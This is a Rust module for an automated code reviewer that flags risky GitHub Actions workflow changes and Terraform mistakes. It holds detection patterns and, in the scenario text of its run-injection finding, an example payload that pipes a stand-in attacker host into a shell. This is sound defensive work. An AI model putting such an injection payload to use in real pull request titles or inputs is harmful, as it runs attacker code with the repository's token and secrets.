//! The workflow and Terraform facts of the review reference (`autoreview_reference.py` `_permissions`,
//! `_workflow_facts`, `_terraform_facts`): host-observed facts about a changed GitHub Actions workflow (an unused
//! `id-token: write`, one handed to another repository's reusable workflow, no `permissions` where siblings set
//! them, a pull request head checked out under a privileged trigger without a same-repository guard, a
//! user-controlled expression interpolated into a run script) and about Terraform (a removed resource still
//! referenced, a new resource without the `prevent_destroy` its siblings set). Each carries a candidate finding and
//! the citations to check.
//!
//! Known differences from the source: none. (Python looked up the `on:` key and then `True`, the key PyYAML gives
//! `on`; the reader here, like the source's, never produces a `True` key, so only `on` is read.)

use std::collections::BTreeSet;
use std::sync::LazyLock;

use indexmap::IndexMap;
use regex::Regex;
use serde_json::{Value, json};

use crate::reference::{Reference, TF_FILE, WORKFLOW, clip, with_id};
use crate::reference_tf::{BLOCK, TfBlock};
use crate::reference_yaml::{Entry, Yaml, YamlKey, py_str};

fn regex(pattern: &str) -> Regex {
    Regex::new(pattern).expect("valid regex")
}

static OIDC_USERS: LazyLock<Regex> = LazyLock::new(|| {
    regex(
        r"(?i)configure-aws-credentials|google-github-actions/auth|azure/login|actions/attest|sigstore|slsa-framework|pypa/gh-action-pypi-publish|cosign|actions/deploy-pages|aws-actions/",
    )
});
static OIDC_RUN: LazyLock<Regex> =
    LazyLock::new(|| regex(r"(?i)--provenance|gh attestation|id-token|ACTIONS_ID_TOKEN_REQUEST"));
static USER_CONTROLLED: LazyLock<Regex> = LazyLock::new(|| {
    regex(
        r"(?i)\$\{\{\s*(?:github\.event\.(?:issue|comment|pull_request|review|review_comment|discussion|commits\[[^\]]*\]|head_commit|inputs)\.[\w.\[\]]*(?:title|body|message|name|ref|label|email|login|default_branch|description)|github\.head_ref|inputs\.[\w.]+|github\.event\.inputs\.[\w.]+)\s*\}\}",
    )
});
static SAME_REPO_GUARD: LazyLock<Regex> = LazyLock::new(|| {
    regex(
        r"(?i)head\.repo\.full_name\s*==\s*github\.repository|head\.repo\.fork\s*==\s*false|!\s*github\.event\.pull_request\.head\.repo\.fork|repo\.owner\.login\s*==|github\.repository_owner\s*==",
    )
});
static ID_TOKEN_WRITE: LazyLock<Regex> = LazyLock::new(|| regex(r"id-token:\s*write"));
static CHECKOUT: LazyLock<Regex> = LazyLock::new(|| regex(r"actions/checkout"));
static HEAD_REF: LazyLock<Regex> = LazyLock::new(|| regex(r"head\.(sha|ref)|head_ref"));
static MUTABLE: LazyLock<Regex> = LazyLock::new(|| regex(r"@(main|master|develop|v?\d+)$"));
static PERMISSIONS_LINE: LazyLock<Regex> = LazyLock::new(|| regex(r"^\s*permissions:"));

/// `_permissions`: a mapping's entries as strings, null values dropped; anything else is no permissions.
pub fn permissions(value: Option<&Yaml>) -> IndexMap<String, String> {
    match value {
        Some(Yaml::Map(map)) => map
            .iter()
            .filter(|(_, item)| !matches!(item, Yaml::Null))
            .map(|(key, item)| (key.py_str(), py_str(item)))
            .collect(),
        _ => IndexMap::new(),
    }
}

/// `str(value or "")`.
fn text_or_empty(value: Option<&Yaml>) -> String {
    value.filter(|value| value.truthy()).map_or(String::new(), py_str)
}

/// The items `for step in value or []` reaches that are mappings (a string or mapping iterates to strings).
fn mappings(value: Option<&Yaml>) -> Vec<&IndexMap<YamlKey, Yaml>> {
    match value {
        Some(Yaml::List(items)) => items.iter().filter_map(Yaml::as_map).collect(),
        _ => Vec::new(),
    }
}

fn get<'v>(map: &'v IndexMap<YamlKey, Yaml>, key: &str) -> Option<&'v Yaml> {
    map.get(&YamlKey::Str(key.to_string()))
}

fn str_at<'v>(map: &'v IndexMap<YamlKey, Yaml>, key: &str) -> Option<&'v str> {
    get(map, key).and_then(Yaml::as_str)
}

fn head_chars(text: &str, count: usize) -> String {
    text.chars().take(count).collect()
}

fn tail_chars(text: &str, count: usize) -> String {
    let chars: Vec<char> = text.chars().collect();
    chars[chars.len().saturating_sub(count)..].iter().collect()
}

fn finding(level: &str, category: &str, claim: String, why: String, scenario: &str, fix: String) -> Value {
    json!({"level": level, "severity": "minor", "finder_level": level, "category": category, "claim": claim,
           "why": why, "scenario": scenario, "suggested_fix": fix, "unpinned": null, "consequence": ""})
}

/// The facts of one changed workflow.
pub fn workflow_facts(reference: &mut Reference<'_>, path: &str) -> Vec<Value> {
    let Some(node) = reference.workflows.get(path).cloned() else {
        return Vec::new();
    };
    let Yaml::Map(doc) = &node.value else {
        return Vec::new();
    };
    let changed: BTreeSet<u64> = reference.changed_lines.get(path).cloned().unwrap_or_default();
    let added_file = reference
        .files
        .iter()
        .filter(|item| item.path == path)
        .flat_map(|item| &item.hunks)
        .flat_map(|hunk| &hunk.lines)
        .all(|line| line.kind == '+');
    let touched = |line: u64| added_file || changed.contains(&line);
    let mut out: Vec<Value> = Vec::new();
    let empty = IndexMap::new();
    let jobs = get(doc, "jobs").and_then(Yaml::as_map).unwrap_or(&empty);
    let trigger_names: Vec<String> = match get(doc, "on") {
        Some(Yaml::Map(map)) => map.keys().map(YamlKey::py_str).collect(),
        Some(Yaml::List(items)) => items.iter().map(py_str).collect(),
        Some(Yaml::Str(text)) => vec![text.clone()],
        _ => Vec::new(),
    };
    let top_permissions = permissions(get(doc, "permissions"));
    let top_line = node
        .lines
        .get(&Entry::Key(YamlKey::Str("permissions".to_string())))
        .copied();
    // Where a job's entries are, for citations.
    let text_lines = reference.repo.lines(path).unwrap_or_default();
    let line_of = |pattern: &Regex, start: u64, end: Option<u64>| -> Option<u64> {
        let last = end
            .filter(|end| *end != 0)
            .unwrap_or(text_lines.len() as u64)
            .min(text_lines.len() as u64);
        (start.max(1)..=last).find(|number| pattern.is_match(&text_lines[*number as usize - 1]))
    };
    let literal = |text: &str| regex(&regex::escape(text));

    let mut uses_oidc = false;
    let mut external_calls: Vec<String> = Vec::new(); // reusable workflows of other repositories
    for job in jobs.values().filter_map(Yaml::as_map) {
        match str_at(job, "uses") {
            Some(uses) if uses.starts_with("./") => {
                let target = uses.split('@').next().unwrap_or("").trim_start_matches(['.', '/']);
                let called = reference.repo.lines(target).unwrap_or_default();
                if called.iter().any(|line| line.contains("id-token")) {
                    uses_oidc = true;
                }
            }
            Some(uses) => {
                uses_oidc = true; // a reusable workflow elsewhere: unknown, assume it may need it
                external_calls.push(uses.to_string());
            }
            None => {}
        }
        for step in mappings(get(job, "steps")) {
            if str_at(step, "uses").is_some_and(|uses| OIDC_USERS.is_match(uses)) {
                uses_oidc = true;
            }
            if str_at(step, "run").is_some_and(|run| OIDC_RUN.is_match(run)) {
                uses_oidc = true;
            }
        }
    }
    // 1. id-token: write granted but nothing uses OIDC.
    let mut grants: Vec<u64> = Vec::new();
    if top_permissions.get("id-token").is_some_and(|value| value == "write")
        && let Some(top) = top_line.filter(|top| *top != 0)
    {
        grants.push(line_of(&ID_TOKEN_WRITE, top, Some(top + 12)).unwrap_or(top));
    }
    for job in jobs.values().filter_map(Yaml::as_map) {
        if permissions(get(job, "permissions"))
            .get("id-token")
            .is_some_and(|value| value == "write")
        {
            grants.push(line_of(&ID_TOKEN_WRITE, 1, None).unwrap_or(1));
        }
    }
    for line in grants {
        if !uses_oidc && touched(line) {
            let id = reference.id("W", &format!("{path}:idtoken:{line}"));
            out.push(with_id(id, json!({
                "kind": "workflow", "shape": "idtoken", "path": path, "line": line, "cite": [[path, line]],
                "text": format!("{path}:{line} grants `id-token: write`, but no step uses an OIDC action or command (configure-aws-credentials, google-github-actions/auth, azure/login, attestations, --provenance): the permission is unnecessary."),
                "finding": finding("low", "security",
                    "The workflow grants `id-token: write` although no step requests an OIDC token.".to_string(),
                    "An unused `id-token: write` widens what a compromised step can do (it can mint identity tokens for cloud providers); the least privilege is not to grant it.".to_string(),
                    "", "Remove `id-token: write` from the permissions, or scope it to the job that authenticates with OIDC.".to_string()),
            })));
        } else if !external_calls.is_empty() && touched(line) {
            // 1b. The grant is the ceiling of a reusable workflow in another repository.
            let called = &external_calls[0];
            let mutable = MUTABLE.is_match(called);
            let id = reference.id("W", &format!("{path}:idtoken-external:{line}"));
            out.push(with_id(id, json!({
                "kind": "workflow", "shape": "idtoken-external", "path": path, "line": line, "cite": [[path, line]],
                "text": format!("{path}:{line} grants `id-token: write` to the external reusable workflow `{called}`{}: nothing in this repository shows that workflow needs an OIDC token.",
                                if mutable { " (a mutable ref)" } else { "" }),
                "finding": finding("low", "security",
                    format!("The workflow grants `id-token: write` to the external reusable workflow `{called}`."),
                    format!("The caller's permissions are the ceiling of the called workflow: with `id-token: write` the code behind that reference{} can mint OIDC identity tokens for cloud providers as this repository, whether or not it needs them today.",
                            if mutable { ", which can change under the mutable ref," } else { "" }),
                    "", format!("Grant only what the called workflow documents it needs; drop `id-token: write` unless it authenticates with OIDC{}",
                                if mutable { ", and pin the reference to a commit SHA." } else { "." })),
            })));
        }
    }
    // 2. No permissions block where sibling workflows have one (a convention of this repository).
    let jobs_line = node
        .lines
        .get(&Entry::Key(YamlKey::Str("jobs".to_string())))
        .copied()
        .filter(|line| *line != 0);
    let any_job_permissions = jobs.values().any(|job| {
        job.as_map()
            .is_some_and(|job| get(job, "permissions").is_some_and(Yaml::truthy))
    });
    if !jobs.is_empty() && top_permissions.is_empty() && !any_job_permissions {
        let first_permissions = |other: &str| -> Option<u64> {
            let lines = reference.repo.lines(other).unwrap_or_default();
            lines
                .iter()
                .position(|line| PERMISSIONS_LINE.is_match(line))
                .map(|index| index as u64 + 1)
        };
        let with_permissions: Vec<(String, u64)> = reference
            .repo
            .files()
            .into_iter()
            .filter(|other| WORKFLOW.is_match(other) && other != path)
            .filter_map(|other| first_permissions(&other).map(|line| (other, line)))
            .collect();
        if with_permissions.len() >= 2 && (added_file || changed.contains(&jobs_line.unwrap_or(0))) {
            let (sibling, sibling_line) = with_permissions[0].clone();
            let count = with_permissions.len();
            let line = jobs_line.unwrap_or(1);
            let id = reference.id("W", &format!("{path}:permissions"));
            out.push(with_id(id, json!({
                "kind": "workflow", "shape": "permissions", "path": path, "line": line,
                "cite": [[path, line], [sibling, sibling_line]],
                "text": format!("{path} declares no `permissions` block, while {count} sibling workflows do (for example {sibling}:{sibling_line}): GITHUB_TOKEN keeps the repository's default permissions here."),
                "finding": finding("low", "security",
                    "The workflow sets no `permissions`, unlike its sibling workflows, so GITHUB_TOKEN runs with the repository default permissions.".to_string(),
                    format!("{count} other workflows in .github/workflows restrict GITHUB_TOKEN explicitly; this one does not, so its token may have write access it does not need."),
                    "", "Add a top-level `permissions:` block with the least the jobs need (for example `contents: read`).".to_string()),
            })));
        }
    }
    // 3. pull_request_target (or a comment trigger) that checks out the pull request head without a guard.
    let risky: Vec<&String> = trigger_names
        .iter()
        .filter(|name| {
            matches!(
                name.as_str(),
                "pull_request_target" | "issue_comment" | "pull_request_review" | "pull_request_review_comment"
            )
        })
        .collect();
    if !risky.is_empty() {
        let risky_list = risky.iter().map(|name| name.as_str()).collect::<Vec<_>>().join(", ");
        for (job_name, job) in jobs.iter() {
            let Some(job) = job.as_map() else {
                continue;
            };
            let job_name = job_name.py_str();
            let mut guard_texts = vec![text_or_empty(get(job, "if"))];
            for step in mappings(get(job, "steps")) {
                guard_texts.push(text_or_empty(get(step, "if")));
                let reference_text = match get(step, "with") {
                    Some(Yaml::Map(with)) => text_or_empty(get(with, "ref")),
                    _ => String::new(),
                };
                let checkout = str_at(step, "uses").is_some_and(|uses| uses.starts_with("actions/checkout"));
                if !checkout || !HEAD_REF.is_match(&reference_text) {
                    continue;
                }
                if guard_texts.iter().any(|text| SAME_REPO_GUARD.is_match(text)) {
                    continue;
                }
                let before = reference_text.split("}}").next().unwrap_or("");
                let line = line_of(&literal(&tail_chars(before, 30)), 1, None)
                    .or_else(|| line_of(&CHECKOUT, 1, None))
                    .unwrap_or(1);
                let near = (line.saturating_sub(3).max(1)..line + 3).any(|number| changed.contains(&number));
                if touched(line) || near {
                    let first = risky[0];
                    let id = reference.id("W", &format!("{path}:fork:{job_name}"));
                    out.push(with_id(id, json!({
                        "kind": "workflow", "shape": "fork-checkout", "path": path, "line": line, "cite": [[path, line]],
                        "text": format!("{path}:{line} ({job_name}) runs on {risky_list} and checks out the pull request head without a same-repository guard (no `head.repo.full_name == github.repository` condition)."),
                        "finding": finding("medium", "security",
                            format!("Job {job_name} checks out the pull request head under a {first} trigger without a same-repository guard."),
                            format!("{first} runs with the base repository's GITHUB_TOKEN and secrets; checking out a fork's head and running its code lets a fork's pull request run arbitrary code with that token."),
                            "A pull request from a fork modifies a script this job runs after checkout; the job executes it with the repository's token and secrets.",
                            "Guard the job with `if: github.event.pull_request.head.repo.full_name == github.repository`, or use the `pull_request` trigger for untrusted code.".to_string()),
                    })));
                }
            }
        }
    }
    // 4. User-controlled expressions interpolated into a run script (expression injection).
    for (job_name, job) in jobs.iter() {
        let Some(job) = job.as_map() else {
            continue;
        };
        let job_name = job_name.py_str();
        for step in mappings(get(job, "steps")) {
            let Some(run) = str_at(step, "run") else {
                continue;
            };
            let Some(found) = USER_CONTROLLED.find(run) else {
                continue;
            };
            let expression = found.as_str();
            let Some(line) = line_of(&literal(&head_chars(expression, 40)), 1, None) else {
                continue;
            };
            if !touched(line) {
                continue;
            }
            let id = reference.id("W", &format!("{path}:inject:{line}"));
            out.push(with_id(id, json!({
                "kind": "workflow", "shape": "run-injection", "path": path, "line": line, "cite": [[path, line]],
                "text": format!("{path}:{line} ({job_name}) interpolates `{}` into a run script: the value is user-controlled and is substituted before the shell parses it.", clip(expression, 80)),
                "finding": finding("medium", "security",
                    format!("A run step interpolates the user-controlled expression `{}` directly into the shell script.", clip(expression, 70)),
                    "GitHub substitutes `${{ }}` expressions into the script text before the shell runs it, so quotes and `$()` in the value become shell syntax.".to_string(),
                    "A pull request title (or body, branch name, comment) containing `\"; curl attacker | sh; echo \"` runs that command in the job.",
                    "Pass the value through an environment variable (`env: TITLE: ${{ ... }}`) and reference `\"$TITLE\"` in the script.".to_string()),
            })));
        }
    }
    out
}

/// The first line of `block` (in its file) that contains `needle`, else the block's first line.
fn line_within(reference: &Reference<'_>, block: &TfBlock, needle: &str) -> u64 {
    let source = reference.repo.lines(&block.path).unwrap_or_default();
    source
        .iter()
        .enumerate()
        .map(|(index, text)| (index as u64 + 1, text))
        .find(|(number, text)| block.line <= *number && *number <= block.end && text.contains(needle))
        .map_or(block.line, |(number, _)| number)
}

fn prevent_destroy(block: &TfBlock) -> bool {
    block
        .nested
        .get("lifecycle")
        .and_then(|lifecycle| lifecycle.get("prevent_destroy"))
        .is_some_and(|value| crate::py::strip(value) == "true")
}

/// The Terraform facts of the change.
pub fn terraform_facts(reference: &mut Reference<'_>) -> Vec<Value> {
    let mut out = Vec::new();
    let all_blocks: Vec<TfBlock> = reference.terraform.values().flatten().cloned().collect();
    if all_blocks.is_empty() {
        return out;
    }
    // 1. A resource removed by the change is still referenced in a file that keeps it.
    let removals: Vec<(String, Vec<String>)> = reference
        .files
        .iter()
        .filter(|item| TF_FILE.is_match(&item.path))
        .map(|item| {
            (
                item.path.clone(),
                reference.removed_text.get(&item.path).cloned().unwrap_or_default(),
            )
        })
        .collect();
    for (removed_from, texts) in removals {
        for text in texts {
            let Some(found) = BLOCK.captures(&text) else {
                continue;
            };
            let kind = &found[1];
            if kind != "resource" && kind != "data" {
                continue;
            }
            let part = |index: usize| found.get(index).map_or("None", |m| m.as_str());
            let address = if kind == "resource" {
                format!("{}.{}", part(2), part(3))
            } else {
                format!("data.{}.{}", part(2), part(3))
            };
            if all_blocks.iter().any(|block| block.address() == address) {
                continue; // moved, not removed
            }
            let still: Vec<&TfBlock> = all_blocks
                .iter()
                .filter(|block| block.refs.contains(&address) && !(block.kind == kind && block.address() == address))
                .collect();
            for block in still.into_iter().take(3) {
                let line = line_within(reference, block, &address);
                let id = reference.id("T", &format!("ref:{address}:{}", block.path));
                let holder = block.address();
                out.push(with_id(id, json!({
                    "kind": "terraform", "shape": "tf-removed-ref", "path": block.path, "line": line,
                    "cite": [[block.path, line]],
                    "text": format!("The change removes `{address}` from {removed_from}, but {}:{line} ({holder}) still references it.", block.path),
                    "finding": finding("medium", "correctness",
                        format!("`{holder}` still references `{address}`, which this change removes."),
                        "A reference to a resource that no longer exists fails at plan time.".to_string(),
                        &format!("`terraform plan` fails: `{address}` is referenced by {holder} but is not declared."),
                        format!("Update or remove the reference in {}, or keep `{address}`.", block.path)),
                })));
            }
        }
    }
    // 2. A new resource of a type whose siblings carry prevent_destroy, without it.
    let files: Vec<(String, Vec<TfBlock>)> = reference
        .terraform
        .iter()
        .map(|(path, blocks)| (path.clone(), blocks.clone()))
        .collect();
    for (path, blocks) in files {
        let changed = reference.changed_lines.get(&path).cloned().unwrap_or_default();
        for block in blocks {
            if block.kind != "resource" || !changed.contains(&block.line) {
                continue;
            }
            let address = block.address();
            let protected: Vec<&TfBlock> = all_blocks
                .iter()
                .filter(|other| other.kind == "resource" && other.r#type == block.r#type && other.address() != address)
                .filter(|other| prevent_destroy(other))
                .collect();
            if protected.len() < 2 || prevent_destroy(&block) {
                continue;
            }
            let other = protected[0];
            let other_line = line_within(reference, other, "prevent_destroy");
            let id = reference.id("T", &format!("protect:{address}"));
            out.push(with_id(id, json!({
                "kind": "terraform", "shape": "tf-prevent-destroy", "path": path, "line": block.line,
                "cite": [[path, block.line], [other.path, other_line]],
                "text": format!("{path}:{} adds `{address}` without `lifecycle {{ prevent_destroy = true }}`, which {} sibling resources of type {} set (for example {} at {}:{other_line}).",
                                block.line, protected.len(), block.r#type, other.address(), other.path),
                "finding": finding("low", "correctness",
                    format!("`{address}` lacks the `prevent_destroy` lifecycle rule its sibling {} resources set.", block.r#type),
                    "Sibling resources of the same type are protected from accidental destruction; this one is not, so a plan that replaces it destroys it.".to_string(),
                    "", "Add `lifecycle { prevent_destroy = true }` as the siblings do, or state why this resource may be destroyed.".to_string()),
            })));
        }
    }
    out
}
